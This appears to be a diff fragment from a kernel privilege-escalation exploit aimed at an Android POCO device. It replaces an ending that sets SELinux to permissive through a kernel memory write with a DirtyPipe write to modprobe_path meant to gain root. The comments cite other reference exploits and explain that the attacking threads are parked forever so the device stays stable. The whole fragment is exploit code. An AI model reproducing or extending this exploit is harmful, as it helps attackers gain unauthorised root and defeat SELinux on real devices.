-     * Exiting — even via SIGUSR2 + FUTEX_UNLOCK_PI — frees Y's stack under a live
-     * kernel reference, so futex_exit / rt_mutex cleanup deadlocks POCO's
-     * 5.15.180 (watchdog reboot / unresponsive device).
-     * Reference exploits universally keep the ghost-holding thread alive and park
-     * the process forever (poc-ref/mcast_permissive.c:673, IonStackQuest3/exp32,
-     * ghostlock17.c). selinux_permissive() wrote kernel memory, so the permissive
-     * state persists independently of this process. X and Y keep spinning in their
-     * for(;;) loops (exit_requested is never set), keeping their stacks mapped. */
-    pr_success("=== selinux permissive achieved; parking forever (device stays responsive) ===");
-    for (;;)
-        sleep(3600);
-    return 0;
+    /* PHASE 3: DirtyPipe CAN_MERGE write to modprobe_path */
+    pr_info("=== DIRTYPIPE MODPROBE_PATH WRITE ===");
+    int ret = -1;
+    if (dirtypipe_init() != 0) {
+        pr_err("=== DirtyPipe init failed (slots not mapped) ===");
+    } else {
+        ret = dirtypipe_modprobe_path();
+    }
+
+    if (ret == 0) {
+        pr_success("=== ROOT ACHIEVED via DirtyPipe modprobe_path ===");
+    } else {
+        pr_err("=== DirtyPipe modprobe_path failed (ret=%d) ===", ret);
+    }
+
+    pr_warn("stable test: parking forever. do not join/exit X/Y.");
+    for (;;) sleep(3600);
+    return ret;
 }
